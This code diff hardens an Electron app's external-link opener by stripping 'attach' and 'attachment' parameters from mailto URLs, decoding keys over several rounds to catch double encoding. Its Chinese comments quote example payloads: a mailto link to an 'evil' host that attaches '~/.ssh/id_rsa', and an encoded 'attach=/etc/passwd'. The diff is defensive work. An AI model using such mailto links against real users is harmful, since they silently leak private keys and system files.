@@ -3,6 +3,7 @@
 // 上限 cap 避免 OOM。返回完整 ExecResult,plugin 等 process exit 后拿。
 
 import { startsWithAllowedExternalScheme } from '../../shared/url-limits';
+import { startsWithAsciiIgnoreCase } from '../../shared/lower-if-needed';
 import { spawn } from 'node:child_process';
 import { shell } from 'electron';
 import { codedError, errorMessage } from '../../shared/error-message';
@@ -348,6 +349,53 @@ export function isAllowedExternalUrl(url: string): boolean {
   return startsWithAllowedExternalScheme(url);
 }
 
+// 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
+// KMail CVE-2020-11880)。openExternal 的输入含不受信 markdown / 终端输出链接,`mailto:x@evil?attach=~/.ssh/id_rsa`
+// 经 xdg-open 交给邮件客户端即可外发私钥。统一出口删掉这些参数(各平台都做)。
+const MAILTO_BLOCKED_PARAMS = new Set(['attach', 'attachment']);
+// 键名最多解码这么多轮(防双重编码 `%2561ttach`);仍在变化 / 解码失败 → 视为可疑,删除(fail-closed)。
+const MAILTO_KEY_DECODE_ROUNDS = 4;
+
+function isBlockedMailtoKey(rawKey: string): boolean {
+  let key = rawKey;
+  for (let i = 0; i < MAILTO_KEY_DECODE_ROUNDS; i++) {
+    let next: string;
+    try {
+      next = decodeURIComponent(key);
+    } catch {
+      return true;
+    }
+    // 解码后再按 = 截一次:`attach%3D/etc/passwd` 在「先整体解码再切分」的客户端里就是 attach 参数
+    if (next === key) return MAILTO_BLOCKED_PARAMS.has(key.split('=', 1)[0]!.trim().toLowerCase());
+    key = next;
+  }
+  return true;
+}
+
+/** 交系统打开前的 URL 净化:mailto 删 attach / attachment 参数;其它 URL 原样返回。 */
+export function sanitizeExternalUrl(url: string): string {
+  if (!startsWithAsciiIgnoreCase(url, 'mailto:')) return url;
+  const q = url.indexOf('?');
+  if (q < 0) return url;
+  const hashIdx = url.indexOf('#', q);
+  const query = url.slice(q + 1, hashIdx < 0 ? undefined : hashIdx);
+  const hash = hashIdx < 0 ? '' : url.slice(hashIdx);
+  // 按 & 与 ; 切分(部分客户端把 ; 当分隔符);未删参数保留原文、顺序与原分隔符。无可删参数 → 原样返回。
+  const parts = query.split(/([&;])/); // [段, 分隔符, 段, 分隔符, ...]
+  let out = '';
+  let removed = false;
+  for (let i = 0; i < parts.length; i += 2) {
+    const part = parts[i]!;
+    if (part !== '' && isBlockedMailtoKey(part.split('=', 1)[0]!)) {
+      removed = true;
+      continue;
+    }
+    out += out === '' ? part : (parts[i - 1] ?? '&') + part;
+  }
+  if (!removed) return url;
+  return url.slice(0, q) + (out !== '' ? `?${out}` : '') + hash;
+}
+
 export async function openExternalUrl(
   input: IpcShellOpenExternalInput,
 ): Promise<void> {
@@ -357,5 +405,5 @@ export async function openExternalUrl(
       `[shell.openExternal] scheme not allowed: ${url.slice(0, 32)}...`,
     );
   }
-  await shell.openExternal(url);
+  await shell.openExternal(sanitizeExternalUrl(url));
 }
